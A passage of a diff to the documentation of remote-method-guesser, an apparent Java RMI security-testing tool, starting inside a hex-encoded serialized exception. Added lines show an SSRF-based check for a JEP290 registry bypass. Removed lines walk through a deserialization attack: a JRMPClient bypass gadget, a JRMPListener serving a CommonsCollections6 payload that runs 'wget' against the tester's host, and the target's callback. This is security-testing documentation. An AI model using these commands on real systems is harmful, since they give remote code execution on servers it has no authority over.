65727074000472756e3071007e001f71007e00127371007e000d02ffffffff7071007e00697074000c6c616d6264612472756e243071007e001f71007e00127371007e000d02fffffffe7071007e00617071007e006271007e001171007e00127371007e000d02ffffffff7071007e00697071007e005e71007e001f71007e00127371007e000d02ffffffff707400276a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f727074000972756e576f726b657271007e001171007e00127371007e000d02ffffffff7074002e6a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f7224576f726b65727071007e005e71007e001171007e00127371007e000d02ffffffff707400106a6176612e6c616e672e5468726561647071007e005e71007e001171007e00127372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede02000071007e0001787078
 
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.18.0.2 - - [27/Dec/2020 06:16:00] code 404, message File not found
-172.18.0.2 - - [27/Dec/2020 06:16:00] "GET /vulnerable HTTP/1.1" 404 -
+[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --scan-action filter-bypass --ssrf-response 4e00093132372e302e302e310000c49651aced0005770f02c95068b90000017d8947959b800f737200226a6176612e6c616e672e496c6c6567616c417267756d656e74457863657074696f6eb58973d37d668fbc02000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e6c616e672e52756e74696d65457863657074696f6e9e5f06470a3483e502000071007e0001787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000071007e0001787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b71007e0001787071007e0009740019706f7274206f7574206f662072616e67653a313233343536377572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000071007e000178700000002d7372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd85020008420006666f726d617449000a6c696e654e756d6265724c000f636c6173734c6f616465724e616d6571007e00064c000e6465636c6172696e67436c61737371007e00064c000866696c654e616d6571007e00064c000a6d6574686f644e616d6571007e00064c000a6d6f64756c654e616d6571007e00064c000d6d6f64756c6556657273696f6e71007e000671007e0001787002ffffffff7074001a6a6176612e6e65742e496e6574536f636b65744164647265737370740009636865636b506f72747400096a6176612e62617365740005392e302e347371007e000d02ffffffff7071007e000f707400063c696e69743e71007e001171007e00127371007e000d02ffffffff7074000f6a6176612e6e65742e536f636b65747071007e001471007e001171007e00127371007e000d010000001674000361707074003164652e7174632e726d672e7365727665722e737372662e726d692e4c6f63616c686f7374536f636b6574466163746f727974001b4c6f63616c686f7374536f636b6574466163746f72792e6a61766174000c637265617465536f636b657470707371007e000d02ffffffff7074002173756e2e726d692e7472616e73706f72742e7463702e544350456e64706f696e74707400096e6577536f636b65747400086a6176612e726d6971007e00127371007e000d02ffffffff7074002073756e2e726d692e7472616e73706f72742e7463702e5443504368616e6e656c70740010637265617465436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7071007e00217074000d6e6577436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7365727665722e556e696361737452656670740006696e766f6b6571007e001f71007e00127371007e000d02ffffffff7074002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657270740012696e766f6b6552656d6f74654d6574686f6471007e001f71007e00127371007e000d02ffffffff7071007e00297071007e002771007e001f71007e00127371007e000d01ffffffff740008706c6174666f726d740015636f6d2e73756e2e70726f78792e2450726f78793370740012637265617465536572766572536f636b657470707371007e000d02ffffffff7071007e001d7074000f6e6577536572766572536f636b657471007e001f71007e00127371007e000d02ffffffff7074002273756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f7274707400066c697374656e71007e001f71007e00127371007e000d02ffffffff7071007e00337074000c6578706f72744f626a65637471007e001f71007e00127371007e000d02ffffffff7071007e001d7071007e003671007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7472616e73706f72742e4c6976655265667071007e003671007e001f71007e00127371007e000d02ffffffff7074001f73756e2e726d692e7365727665722e556e69636173745365727665725265667071007e003671007e001f71007e00127371007e000d02ffffffff707400236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a6563747071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7074000872656578706f727471007e001f71007e00127371007e000d02ffffffff7071007e003d7074000a726561644f626a65637471007e001f71007e00127371007e000d02fffffffe7074002d6a646b2e696e7465726e616c2e7265666c6563742e4e61746976654d6574686f644163636573736f72496d706c70740007696e766f6b653071007e001171007e00127371007e000d02ffffffff7071007e00447071007e002771007e001171007e00127371007e000d02ffffffff707400316a646b2e696e7465726e616c2e7265666c6563742e44656c65676174696e674d6574686f644163636573736f72496d706c7071007e002771007e001171007e00127371007e000d02ffffffff707400186a6176612e6c616e672e7265666c6563742e4d6574686f647071007e002771007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a65637453747265616d436c61737370740010696e766f6b65526561644f626a65637471007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a656374496e70757453747265616d7074000e7265616453657269616c4461746171007e001171007e00127371007e000d02ffffffff7071007e004f70740012726561644f7264696e6172794f626a65637471007e001171007e00127371007e000d02ffffffff7071007e004f7074000b726561644f626a6563743071007e001171007e00127371007e000d02ffffffff7071007e004f7071007e004271007e001171007e00127371007e000d02ffffffff7074002273756e2e726d692e72656769737472792e5265676973747279496d706c5f536b656c70740008646973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7074000b6f6c64446973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7071007e005871007e001f71007e00127371007e000d02ffffffff7074001d73756e2e726d692e7472616e73706f72742e5472616e73706f727424317074000372756e71007e001f71007e00127371007e000d02ffffffff7071007e005d7071007e005e71007e001f71007e00127371007e000d02fffffffe7074001e6a6176612e73656375726974792e416363657373436f6e74726f6c6c65727074000c646f50726976696c6567656471007e001171007e00127371007e000d02ffffffff7074001b73756e2e726d692e7472616e73706f72742e5472616e73706f72747074000b7365727669636543616c6c71007e001f71007e00127371007e000d02ffffffff7071007e00337074000e68616e646c654d6573736167657371007e001f71007e00127371007e000d02ffffffff7074003473756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f727424436f6e6e656374696f6e48616e646c65727074000472756e3071007e001f71007e00127371007e000d02ffffffff7071007e00697074000c6c616d6264612472756e243071007e001f71007e00127371007e000d02fffffffe7071007e00617071007e006271007e001171007e00127371007e000d02ffffffff7071007e00697071007e005e71007e001f71007e00127371007e000d02ffffffff707400276a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f727074000972756e576f726b657271007e001171007e00127371007e000d02ffffffff7074002e6a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f7224576f726b65727071007e005e71007e001171007e00127371007e000d02ffffffff707400106a6176612e6c616e672e5468726561647071007e005e71007e001171007e00127372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede02000071007e0001787078
+[+] RMI registry JEP290 bypass enmeration:
+[+]
+[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
+[+] 	  Vulnerability Status: Vulnerable
 ```
 
-The callback from the server shows that the attack was successful. With *JEP290* installed, the server would have rejected the deserialization instead.
-
-Whereas the deserialization filter on the *DGC* is very strict and there are currently no known bypasses, the *RMI registry* itself needs to allow more
-classes to be deserialized in order to work correctly. This was abused for some bypasses in the past, where the two most prominent bypasses are the
-*JRMPClient* gadget of the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java) and
-the [RemoteObjectInvocationHandler bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) by [An Trinh](https://twitter.com/_tint0).
-Both of them can be used together with *remote-method-guesser's* ``reg`` action and possibly bypass an outdated *JEP290* installation.
-
-Notice that both bypass gadgets cannot be used to execute code directly. Instead they create an outbound *RMI* connection, which is no longer protected
-by the deserialization filters. This outbound channel can now be used for deserialization attacks. The most common way to do this is probably using
-[ysoserials JRMPListener](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) and since it is so common,
-*remote-method-guesser* has builtin a shortcut (``listen``) to launch this listener.
-
-```console
-[qtc@kali ~]$ rmg 172.18.0.2 9010 reg JRMPClient 172.18.0.1:4444
-[+] Creating ysoserial payload... done.
-[+] 
-[+] Attempting deserialization attack on RMI registry endpoint...
-[+] 
-[+] 	Caught ClassCastException during deserialization attack.
-[+] 	The server uses either readString() to unmarshal String parameters, or
-[+] 	Deserialization attack was probably successful :)
-
-
-[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "wget 172.17.0.1:8000/vulnerable"
-[+] Creating a JRMPListener on port 4444.
-[+] Handing off to ysoserial...
-* Opening JRMP listener on 4444
-Have connection from /172.18.0.2:40704
-Reading message...
-Is DGC call for [[0:0:0, -1407888899]]
-Sending return with payload for obj [0:0:0, 2]
-Closing connection
-
-
-[qtc@kali www]$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-172.18.0.2 - - [08/Jan/2021 08:43:14] "GET /vulnerable HTTP/1.1" 200 -
-```
+More examples for the ``--ssrf`` and ``--ssrf-response`` actions can be found in the documentation of the
+[SSRF example server](/docker/ssrf-server).
